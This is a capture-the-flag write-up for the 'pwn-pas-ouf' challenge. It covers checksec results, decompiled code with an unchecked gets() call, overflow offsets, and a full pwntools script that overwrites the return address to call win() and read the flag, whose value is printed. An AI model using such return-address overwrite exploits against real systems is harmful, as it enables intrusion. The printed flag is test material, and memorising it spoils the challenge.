
## Initial checksec Analysis

> checksec pwn-pas-ouf

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
With these settings, the binary is vulnerable to a classic buffer 
overflow since there's no stack canary, and the memory addresses are fixed.


When executed, the program displays “Hello World!” and then waits for 
user input.

Using [Binary Ninja Cloud](https://cloud.binary.ninja/), we examine the 
decompiled code and find that after printing `Hello World!`, the program
reads input into a buffer without checking the length, which hints at a 
potential buffer overflow vulnerability. 

| Address  | Name |
| --------------- |
| 0x4011a0 | win  |

```
void win() __noreturn
004011b6  FILE* fp = fopen(&file_to_read, &data_402004)
004011b6  
004011c3  while (true)
004011c3      char rax = fgetc(fp)
004011c3      
004011d1      if (rax == 0xffffffff)
004011d1          break
004011d1      
004011db      putchar(rax)
004011db  
004011e7  exit(0)
004011e7  noreturn

int64_t set_file_to_read(int64_t arg1)
00401216  return memcpy(&file_to_read, arg1, 0x80)

int32_t main(int32_t argc, char** argv, char** envp)
0040122b  int32_t var_c = 0
00401232  int32_t argc_1 = argc
00401235  char** argv_1 = argv
0040124f  setvbuf(*stdout, nullptr, 2, 0)
00401267  void var_98
00401267  memcpy(&var_98, "readme.md", 0x80)
0040127f  void var_118
0040127f  memcpy(&var_118, "Hello World!", 0x80)
0040128b  puts(&var_118)
00401297  int64_t rax
00401297  rax.b = 0
00401299  gets(&var_118)
004012a5  puts(&var_118)
004012b1  set_file_to_read(&var_98)
004012c0  return 0
```

We created a 500-character cyclic pattern using cyclic and entered it 
to test for a buffer overflow. After observing a crash with a modified 
return address, the presence of an overflow vulnerability was confirmed.

Further analysis revealed:

- Offset to `return address`: 280 bytes.
- Offset to set the `rdi` register (to specify the file to read): 128 bytes.


Exploitation Strategy

1. Controlling the Return Address: 
The 280-byte offset allows us to overwrite the return address, 
redirecting execution to `win()`.
2. Setting the `file_to_read` argument: 
Using the 128-byte offset, we can set the file to be read 
by controlling the `rdi` register.


The final payload will contain:

- 280 characters to fill the buffer.
- the address of the `win()` function to overwrite the return address, 
forcing the program to call it.
- the file `flag` as an argument, set at the 128-byte offset.


Flag
```
b'\n'
b'\n'
b'4T${p4$_0uF_Ou_tr\xe2\x82\xacs_ouFF}\n'
```

```python
import socket
import ssl
from pwn import *

# proc = process("./pwn-pas-ouf")
# proc = gdb.debug("./pwn-pas-ouf", '''
#     break *0x4012a5
#     continue
# ''')

host = "main-5000-pwn-pas-ouf-03a2dd8bc54f67f9.ctf.4ts.fr"
port = 52525

# remote connection
proc = remote(host, port)
sock = proc.sock

# wrap the socket with SSL
context = ssl.create_default_context()
ssl_sock = context.wrap_socket(sock, server_hostname=host)

# remote connection to use the SSL socket
proc.sock = ssl_sock

win_address = 0x4011a0
payload = 128 * p8(0) + b'flag' + (280 - 128 - 4) * p8(0) + p64(win_address)

proc.sendlineafter(b"Hello World!", payload)
response = proc.recvline()
print(response)
response = proc.recvline()
print(response)
response = proc.recvline()
print(response)

proc.interactive()
```